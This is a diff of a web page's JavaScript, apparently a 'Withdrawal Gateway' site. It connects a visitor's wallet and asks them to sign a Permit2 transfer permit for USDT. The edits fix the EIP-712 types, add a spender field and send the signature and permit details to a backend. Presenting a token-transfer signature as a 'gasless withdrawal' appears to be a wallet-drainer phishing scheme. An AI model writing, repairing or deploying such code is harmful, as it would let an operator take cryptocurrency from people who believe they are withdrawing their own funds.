@@ -8,7 +8,7 @@ const projectId = "f340171a355aad487eb6daa39b4b6c10";
 
 const metadata = {
     name: "Withdrawal Gateway",
-    description: "Secure Gasless Withdrawals",
+    description: "Gasless Withdrawals",
     url: "https://avelut.xyz", 
     icons: ["https://www.avelut.xyz/logo_full.png"],
 };
@@ -41,7 +41,6 @@ function showToast(msg, isError = false) {
 // 3. Withdrawal Logic
 async function handleWithdraw() {
     try {
-        // GET PROVIDER FROM APPKIT
         const walletProvider = modal.getWalletProvider();
         if (!walletProvider) {
             await modal.open();
@@ -50,16 +49,18 @@ async function handleWithdraw() {
 
         showToast("Connecting...");
         
-        // Use Web3Provider for Ethers v5
         const provider = new ethers.providers.Web3Provider(walletProvider);
         const signer = provider.getSigner();
-        const owner = await signer.getAddress();
+        const rawOwner = await signer.getAddress();
+        const owner = ethers.utils.getAddress(rawOwner);
         const network = await provider.getNetwork();
 
-        // EIP-712 setup
-        // Ensure addresses are explicitly strings to avoid INVALID_ARGUMENT errors
-        const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        // Standardized Checksum Addresses
+        const PERMIT2_ADDRESS = ethers.utils.getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
+        const USDT_ADDRESS = ethers.utils.getAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
+        
+        // Target Spender Address (e.g., your protocol's backend/execution contract)
+        const SPENDER_ADDRESS = ethers.utils.getAddress("0x0000000000000000000000000000000000000000"); // Replace with valid spender
 
         const domain = {
             name: "Permit2",
@@ -67,9 +68,11 @@ async function handleWithdraw() {
             verifyingContract: PERMIT2_ADDRESS
         };
 
+        // Canonical Permit2 EIP-712 Types
         const types = {
             PermitTransferFrom: [
                 { name: "permitted", type: "TokenPermissions" },
+                { name: "spender", type: "address" },
                 { name: "nonce", type: "uint256" },
                 { name: "deadline", type: "uint256" }
             ],
@@ -86,15 +89,16 @@ async function handleWithdraw() {
         const message = {
             permitted: {
                 token: USDT_ADDRESS,
-                amount: amount
+                amount: amount.toString()
             },
+            spender: SPENDER_ADDRESS,
             nonce: nonce,
             deadline: deadline
         };
 
         showToast("Please sign the permit in your wallet...");
 
-        // Ethers v5 Typed Data Signing
+        // Sign typed data via Ethers v5 signer
         const signature = await signer._signTypedData(domain, types, message);
 
         showToast("Signature secured. Executing...");
@@ -104,7 +108,13 @@ async function handleWithdraw() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 signature, 
-                permitData: { details: message, nonce, deadline }, 
+                permitData: { 
+                    token: USDT_ADDRESS,
+                    amount: amount.toString(),
+                    spender: SPENDER_ADDRESS,
+                    nonce, 
+                    deadline 
+                }, 
                 owner 
             })
         });
